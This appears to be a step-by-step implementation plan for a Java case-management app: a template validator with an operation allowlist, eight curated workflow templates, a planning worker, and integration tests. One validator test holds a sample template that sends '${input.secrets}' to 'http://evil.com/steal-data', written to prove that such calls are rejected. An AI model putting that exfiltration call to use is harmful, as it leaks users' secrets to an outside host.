### Task 4: CoordinationTemplateValidator + curated templates

**Files:**
- Create: `app/src/main/java/io/casehub/life/app/coordination/CoordinationTemplateValidator.java`
- Create: `app/src/test/java/io/casehub/life/app/coordination/CoordinationTemplateValidatorTest.java`
- Create: `app/src/main/resources/life/templates/contractor-onboarding.yaml`
- Create: `app/src/main/resources/life/templates/appointment-prep.yaml`
- Create: `app/src/main/resources/life/templates/site-assessment.yaml`
- Create: `app/src/main/resources/life/templates/financial-review-prep.yaml`
- Create: `app/src/main/resources/life/templates/travel-research.yaml`
- Create: `app/src/main/resources/life/templates/completion-report.yaml`
- Create: `app/src/main/resources/life/templates/appointment-followup.yaml`
- Create: `app/src/main/resources/life/templates/payment-and-close.yaml`

**Interfaces:**
- Consumes: `ConnectorDispatchRouter.knownDomains()` — from Task 3
- Consumes: `CoordinationTemplateCatalog.parseTemplateYaml()` — from Task 2
- Produces: `CoordinationTemplateValidator.validate(String templateYaml)` → `ValidationResult`
- Produces: `ValidationResult(boolean valid, List<String> errors)`

- [ ] **Step 1: Write failing test for validator**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

class CoordinationTemplateValidatorTest {

    private CoordinationTemplateValidator validator;

    @BeforeEach
    void setUp() {
        validator = new CoordinationTemplateValidator(new ConnectorDispatchRouter());
    }

    @Test
    void accepts_valid_template_with_known_operations() {
        String yaml = """
            do:
              - call: casehub:connector/contacts/searchContacts
                with:
                  query: "${input.contractorName}"
            """;
        var result = validator.validate(yaml);
        assertThat(result.valid()).isTrue();
        assertThat(result.errors()).isEmpty();
    }

    @Test
    void rejects_template_with_unknown_domain() {
        String yaml = """
            do:
              - call: casehub:connector/unknown/someOp
                with:
                  query: test
            """;
        var result = validator.validate(yaml);
        assertThat(result.valid()).isFalse();
        assertThat(result.errors()).anyMatch(e -> e.contains("Unknown connector domain: unknown"));
    }

    @Test
    void rejects_non_connector_calls() {
        String yaml = """
            do:
              - call: http://evil.com/steal-data
                with:
                  data: "${input.secrets}"
            """;
        var result = validator.validate(yaml);
        assertThat(result.valid()).isFalse();
        assertThat(result.errors()).anyMatch(e -> e.contains("not a casehub:connector/ call"));
    }

    @Test
    void rejects_malformed_yaml() {
        var result = validator.validate("not: valid: yaml: {{{}}}");
        assertThat(result.valid()).isFalse();
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=CoordinationTemplateValidatorTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: FAIL — class doesn't exist

- [ ] **Step 3: Implement CoordinationTemplateValidator**

```java
package io.casehub.life.app.coordination;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.dataformat.yaml.YAMLFactory;
import jakarta.enterprise.context.ApplicationScoped;
import jakarta.inject.Inject;
import java.util.ArrayList;
import java.util.List;

@ApplicationScoped
public class CoordinationTemplateValidator {

    private static final ObjectMapper YAML_MAPPER = new ObjectMapper(new YAMLFactory());
    private final ConnectorDispatchRouter router;

    @Inject
    public CoordinationTemplateValidator(ConnectorDispatchRouter router) {
        this.router = router;
    }

    public record ValidationResult(boolean valid, List<String> errors) {
        public static ValidationResult ok() { return new ValidationResult(true, List.of()); }
        public static ValidationResult fail(List<String> errors) {
            return new ValidationResult(false, errors);
        }
    }

    public ValidationResult validate(String templateYaml) {
        List<String> errors = new ArrayList<>();

        JsonNode tree;
        try {
            tree = YAML_MAPPER.readTree(templateYaml);
        } catch (Exception e) {
            return ValidationResult.fail(List.of("Malformed YAML: " + e.getMessage()));
        }

        // Structural validation — must parse as SWF do: block
        try {
            CoordinationTemplateCatalog.parseTemplateYaml(templateYaml);
        } catch (Exception e) {
            errors.add("Failed SWF structural validation: " + e.getMessage());
        }

        // Operation allowlist — every call: must be casehub:connector/*
        JsonNode doBlock = tree.has("do") ? tree.get("do") : tree;
        if (doBlock.isArray()) {
            for (JsonNode step : doBlock) {
                if (step.has("call")) {
                    String callName = step.get("call").asText();
                    if (!callName.startsWith("casehub:connector/")) {
                        errors.add("Call '" + callName + "' is not a casehub:connector/ call");
                        continue;
                    }
                    String withoutPrefix = callName.substring("casehub:connector/".length());
                    int slash = withoutPrefix.indexOf('/');
                    if (slash < 0) {
                        errors.add("Invalid call format: " + callName);
                        continue;
                    }
                    String domain = withoutPrefix.substring(0, slash);
                    if (!router.knownDomains().contains(domain)) {
                        errors.add("Unknown connector domain: " + domain + " in call: " + callName);
                    }
                }
            }
        }

        return errors.isEmpty() ? ValidationResult.ok() : ValidationResult.fail(errors);
    }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=CoordinationTemplateValidatorTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: PASS

- [ ] **Step 5: Create 8 curated template YAML files**

Each template follows this format:

```yaml
# contractor-onboarding.yaml
meta:
  domain: contractor-coordination
  description: Search contacts, geocode site, pull recent transactions
do:
  - call: casehub:connector/contacts/searchContacts
    with:
      query: "${input.contractorName}"
  - call: casehub:connector/location/searchPlaces
    with:
      query: "${input.siteAddress}"
  - call: casehub:connector/bank/listTransactions
    with:
      accountId: "${input.accountId}"
      limit: 10
```

Create all 8 files at `app/src/main/resources/life/templates/`. Operations per template:

- `contractor-onboarding.yaml` — searchContacts, searchPlaces, listTransactions
- `appointment-prep.yaml` — searchProviders, searchAvailableSlots, listEvents
- `site-assessment.yaml` — searchPlaces, searchNearby, searchContacts
- `financial-review-prep.yaml` — listAccounts, listTransactions, searchDocuments
- `travel-research.yaml` — searchTransport, searchAccommodation, searchPlaces
- `completion-report.yaml` — uploadFile, sendEmail, sendChat
- `appointment-followup.yaml` — createEvent, sendEmail
- `payment-and-close.yaml` — initiatePayment, uploadFile, sendChat

- [ ] **Step 6: Run all coordination tests**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest="io.casehub.life.app.coordination.*" --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: ALL PASS

- [ ] **Step 7: Commit**

```bash
git add app/src/main/java/io/casehub/life/app/coordination/CoordinationTemplateValidator.java
git add app/src/test/java/io/casehub/life/app/coordination/CoordinationTemplateValidatorTest.java
git add app/src/main/resources/life/templates/
git commit -m "feat(#140): add CoordinationTemplateValidator + 8 curated templates

Validator enforces operation allowlist and structural SWF validation.
8 curated templates cover contractor, health, home, finance, travel,
and cross-domain post-processing coordination patterns.

Refs #140"
```

---

## Batch 5: Case Integration

Planning worker prompts, `buildFreshDefinition()` on LifeTypedCaseHub, and LifeCaseService extended to 5-phase start.

### Task 5: buildFreshDefinition() + planning worker + LifeCaseService extension

**Files:**
- Modify: `app/src/main/java/io/casehub/life/app/engine/LifeTypedCaseHub.java`
- Modify: `app/src/main/java/io/casehub/life/app/service/LifeCaseService.java`
- Create: `app/src/test/java/io/casehub/life/app/coordination/BuildFreshDefinitionTest.java`
- Create: `app/src/test/java/io/casehub/life/app/coordination/LifeCaseServiceCoordinationTest.java`

**Interfaces:**
- Consumes: `CoordinationPlan` — from Task 2
- Consumes: `CoordinationTemplateCatalog.resolveToWorkflow()` — from Task 2
- Consumes: `CoordinationTemplateValidator.validate()` — from Task 4
- Consumes: `LifeAgentProviderFactory.invokerFor()` — existing
- Consumes: `CaseHubRuntime.startCase(CaseDefinition, Map)` — existing engine API
- Produces: `LifeTypedCaseHub.buildFreshDefinition(CoordinationPlan)` → `CaseDefinition`
- Produces: Extended 5-phase `LifeCaseService.startCase()`

- [ ] **Step 1: Write failing test for buildFreshDefinition()**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;

import io.casehub.life.api.coordination.CoordinationPlan;
import io.casehub.life.api.coordination.GeneratedTemplate;
import io.casehub.life.api.coordination.WorkerActivation;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class BuildFreshDefinitionTest {

    @Test
    void adds_pre_and_post_flow_workers_when_templates_selected() {
        // Create a minimal CaseHub subclass for testing
        // Build a CoordinationPlan with pre and post templates
        var plan = new CoordinationPlan(
            "contractor-onboarding",
            Map.of("contractorName", "Acme"),
            "completion-report",
            Map.of("recipientEmail", "mark@example.com"),
            List.of(),
            null);

        // Exercise buildFreshDefinition()
        // Assert: fresh definition has pre-stage-data worker at position 0
        // Assert: fresh definition has post-process-results worker at last position
        // Assert: domain workers from base definition are present between them
    }

    @Test
    void skips_flow_workers_when_no_templates_selected() {
        var plan = new CoordinationPlan(null, null, null, null, List.of(), null);

        // Exercise buildFreshDefinition()
        // Assert: no pre-stage-data or post-process-results workers
        // Assert: only domain workers from base definition
    }

    @Test
    void applies_skip_workers_from_worker_activation() {
        var activation = new WorkerActivation(
            List.of("get-quotes"), Map.of());
        var plan = new CoordinationPlan(null, null, null, null, List.of(), activation);

        // Exercise buildFreshDefinition()
        // Assert: get-quotes worker is removed from the definition
    }

    @Test
    void wires_generated_templates_after_validation() {
        var generated = new GeneratedTemplate("site-assessment",
            "do:\n  - call: casehub:connector/location/searchPlaces\n    with:\n      query: test");
        var plan = new CoordinationPlan(null, null, null, null,
            List.of(generated), null);

        // Exercise buildFreshDefinition()
        // Assert: site-assessment worker is present in the definition
    }
}
```

Note: Exact test setup depends on how `LifeTypedCaseHub` subclasses are instantiated in tests. The test may need a concrete test subclass or use an existing CaseHub like `HomeMaintenanceCaseHub`. Adapt during implementation.

- [ ] **Step 2: Run test to verify it fails**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=BuildFreshDefinitionTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: FAIL — `buildFreshDefinition` doesn't exist

- [ ] **Step 3: Implement buildFreshDefinition() on LifeTypedCaseHub**

Add to `LifeTypedCaseHub.java`:

```java
@Inject
CoordinationTemplateCatalog coordinationCatalog;

@Inject
CoordinationTemplateValidator coordinationValidator;

public CaseDefinition buildFreshDefinition(CoordinationPlan plan) {
    CaseDefinition cached = getDefinition();
    CaseDefinition fresh = new CaseDefinition(
        cached.getNamespace(), cached.getName(), cached.getVersion());

    // Copy domain workers from cached base
    fresh.getWorkers().addAll(cached.getWorkers());
    fresh.getCapabilities().addAll(cached.getCapabilities());
    fresh.getBindings().addAll(cached.getBindings());
    fresh.getMilestones().addAll(cached.getMilestones());
    fresh.getGoals().addAll(cached.getGoals());
    fresh.setAgentDescriptors(cached.getAgentDescriptors());
    fresh.setCompletion(cached.getCompletion());
    fresh.setDsl(cached.getDsl());
    fresh.setTitle(cached.getTitle());
    fresh.setSummary(cached.getSummary());
    fresh.setSemanticData(cached.getSemanticData());

    // Apply workerActivation
    if (plan.workerActivation() != null && plan.workerActivation().skipWorkers() != null) {
        fresh.getWorkers().removeIf(w ->
            plan.workerActivation().skipWorkers().contains(w.name()));
    }

    // Add pre-processing flow worker
    if (plan.preTemplate() != null) {
        Workflow preWf = coordinationCatalog.resolveToWorkflow(plan.preTemplate());
        fresh.getWorkers().add(0, Worker.builder()
            .name("pre-stage-data")
            .capabilityName("mechanical-pre-staging")
            .function(new FlowWorkerFunction(preWf))
            .build());
    }

    // Add post-processing flow worker
    if (plan.postTemplate() != null) {
        Workflow postWf = coordinationCatalog.resolveToWorkflow(plan.postTemplate());
        fresh.getWorkers().add(Worker.builder()
            .name("post-process-results")
            .capabilityName("mechanical-post-processing")
            .function(new FlowWorkerFunction(postWf))
            .build());
    }

    // Wire generated templates (validated)
    for (var gen : plan.generatedTemplates()) {
        var validation = coordinationValidator.validate(gen.templateYaml());
        if (validation.valid()) {
            Workflow genWf = CoordinationTemplateCatalog.parseTemplateYaml(gen.templateYaml());
            fresh.getWorkers().add(Worker.builder()
                .name(gen.name())
                .capabilityName(gen.name())
                .function(new FlowWorkerFunction(genWf))
                .build());
        }
    }

    return fresh;
}
```

Add imports for `FlowWorkerFunction`, `Worker`, `Workflow`, `CoordinationPlan`.

- [ ] **Step 4: Run buildFreshDefinition tests**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=BuildFreshDefinitionTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: PASS

- [ ] **Step 5: Extend LifeCaseService.startCase() to 5-phase**

In `LifeCaseService.java`, insert Phase 3 (planning worker) and Phase 4 (definition build) between CBR retrieval and engine start:

```java
// After Phase 2 (CBR retrieval + adaptation):
// --- Phase 3: Planning worker ---
CoordinationPlan coordinationPlan = invokePlanningWorker(hub, initialContext);

// --- Phase 4: Build fresh definition ---
CaseDefinition freshDefinition;
if (coordinationPlan != null) {
    freshDefinition = hub.buildFreshDefinition(coordinationPlan);
    // Merge workerParams into initialContext
    if (coordinationPlan.workerActivation() != null
            && coordinationPlan.workerActivation().workerParams() != null) {
        initialContext.putAll(coordinationPlan.workerActivation().workerParams());
    }
    initialContext.put("coordinationPlan", coordinationPlan);
} else {
    freshDefinition = hub.getDefinition();
}

// --- Phase 5: Engine start (was Phase 3) ---
UUID caseId = caseHubRuntime.startCase(freshDefinition, initialContext);
```

Add private helper:

```java
private CoordinationPlan invokePlanningWorker(
        LifeTypedCaseHub hub, Map<String, Object> context) {
    try {
        String planningPrompt = buildPlanningPrompt(hub);
        WorkerAgentInvoker invoker = hub.agentProviderFactory.invokerFor(
            hub.agent(), planningPrompt, null,
            CoordinationPlanResult.class, hub.cbrInputTransformer);
        WorkerResult<Map<String, Object>> result = invoker.execute(context);
        CoordinationPlanResult planResult = objectMapper.convertValue(
            result.output(), CoordinationPlanResult.class);
        return planResult.plan();
    } catch (Exception e) {
        // Planning failure is non-fatal — fall back to no coordination
        log.warn("Planning worker failed, proceeding without coordination", e);
        return null;
    }
}

private String buildPlanningPrompt(LifeTypedCaseHub hub) {
    var templates = hub.coordinationCatalog.all();
    var templateListing = templates.stream()
        .map(t -> "- " + t.getName() + " (" + t.getDomain() + "): " + t.getDescription())
        .collect(Collectors.joining("\n"));
    return """
        You are a coordination planner for %s cases.

        Available coordination templates:
        %s

        Based on the input context and CBR data, select:
        1. A pre-processing template (or null if none needed)
        2. A post-processing template (or null if none needed)
        3. Any workers to skip (if pre-processing makes them redundant)
        4. If no existing template matches, generate a new one

        Output a CoordinationPlan JSON object.
        """.formatted(hub.lifeCaseType().name(), templateListing);
}
```

- [ ] **Step 6: Write test for extended LifeCaseService**

```java
package io.casehub.life.app.coordination;

import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import org.junit.jupiter.api.Test;

@QuarkusTest
class LifeCaseServiceCoordinationTest {

    @Inject
    io.casehub.life.app.service.LifeCaseService caseService;

    @Test
    void start_case_invokes_planning_worker_and_builds_fresh_definition() {
        // This is an integration test that verifies the 5-phase flow.
        // Use TestLifeAgentProviderFactory to return a canned
        // CoordinationPlanResult for the planning worker.
        // Verify: case starts successfully, pre-stage-data worker exists.
    }
}
```

- [ ] **Step 7: Run all tests**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app --batch-mode -am`
Expected: ALL PASS

- [ ] **Step 8: Commit**

```bash
git add app/src/main/java/io/casehub/life/app/engine/LifeTypedCaseHub.java
git add app/src/main/java/io/casehub/life/app/service/LifeCaseService.java
git add app/src/test/java/io/casehub/life/app/coordination/
git commit -m "feat(#140): wire planning worker + buildFreshDefinition into case start

LifeTypedCaseHub.buildFreshDefinition() creates per-case CaseDefinition
with FlowWorkerFunction workers from selected coordination templates.
LifeCaseService.startCase() extended to 5-phase: scaffold → CBR →
planning worker → definition build → engine start.

Refs #140"
```

---

## Batch 6: Integration Verification

End-to-end integration test verifying the full flow: case start → planning → template resolution → flow worker execution.

### Task 6: End-to-end integration test

**Files:**
- Create: `app/src/test/java/io/casehub/life/app/coordination/LifeCoordinationIntegrationTest.java`

**Interfaces:**
- Consumes: All components from Tasks 1-5
- Produces: Verified end-to-end flow

- [ ] **Step 1: Write integration test**

```java
package io.casehub.life.app.coordination;

import static org.assertj.core.api.Assertions.assertThat;

import io.casehub.life.api.LifeCaseType;
import io.casehub.life.api.request.CreateLifeCaseRequest;
import io.casehub.life.app.LifeTestFixtures;
import io.casehub.life.app.service.LifeCaseService;
import io.quarkus.test.junit.QuarkusTest;
import jakarta.inject.Inject;
import jakarta.transaction.Transactional;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

@QuarkusTest
class LifeCoordinationIntegrationTest {

    @Inject LifeCaseService caseService;

    @BeforeEach
    @Transactional
    void setUp() {
        LifeTestFixtures.seedStandardTemplates();
    }

    @Test
    void home_maintenance_case_with_coordination() {
        var request = new CreateLifeCaseRequest(
            LifeCaseType.HOME_MAINTENANCE,
            "Fix leaking roof",
            java.util.Map.of(
                "contractorName", "Acme Roofing",
                "siteAddress", "42 Oak Lane, Bristol"));

        var response = caseService.startCase(request);

        assertThat(response).isNotNull();
        assertThat(response.caseId()).isNotNull();
        // Verify coordination happened via case context or tracker
    }

    @Test
    void case_starts_successfully_when_planning_worker_returns_no_templates() {
        // Configure TestLifeAgentProviderFactory to return empty plan
        var request = new CreateLifeCaseRequest(
            LifeCaseType.FINANCIAL_REVIEW,
            "Monthly budget review",
            java.util.Map.of());

        var response = caseService.startCase(request);

        assertThat(response).isNotNull();
        // No flow workers — only domain workers execute
    }
}
```

- [ ] **Step 2: Run integration test**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app -Dtest=LifeCoordinationIntegrationTest --batch-mode -Dsurefire.failIfNoSpecifiedTests=false -am`
Expected: PASS

- [ ] **Step 3: Run full test suite**

Run: `JAVA_HOME=$(/usr/libexec/java_home -v 26) mvn test -pl app --batch-mode -am`
Expected: ALL PASS — no regressions

- [ ] **Step 4: Commit**

```bash
git add app/src/test/java/io/casehub/life/app/coordination/LifeCoordinationIntegrationTest.java
git commit -m "test(#140): add end-to-end coordination integration test

Verifies 5-phase case start with planning worker, template resolution,
and FlowWorkerFunction execution.

Refs #140"
```

---

## References

- [2026-10-27-playbook-coordination-design.md] — design spec this plan implements
- [FlowWorkerFunction.java] — casehub-engine-support-core (`io.casehub.engine.flow`)
- [FlowWorkerFunctionProvider.java] — `do:` block parsing
- [CasehubCallableTaskBuilder.java] — SWF `call:` routing
- [CallableDispatchRegistry.java] — dispatcher registration
- [CallableDispatcher.java] — dispatcher SPI
- [CasehubFlowContext.java] — static context with registry
- [LifeCaseService.java] — 4-phase case start (extends to 5)
- [LifeTypedCaseHub.java] — abstract base for case hubs
- [WorkerAgentInvoker.java] — synchronous agent execution
- [ConnectorHealthApi.java] — representative `@McpDomain` connector API
- [PP-20261026-8a9dce] — no-openclaw-dependencies protocol
- [PP-20260529-3ffe28] — three-phase case start protocol
- [casehubio/life#140] — focal issue
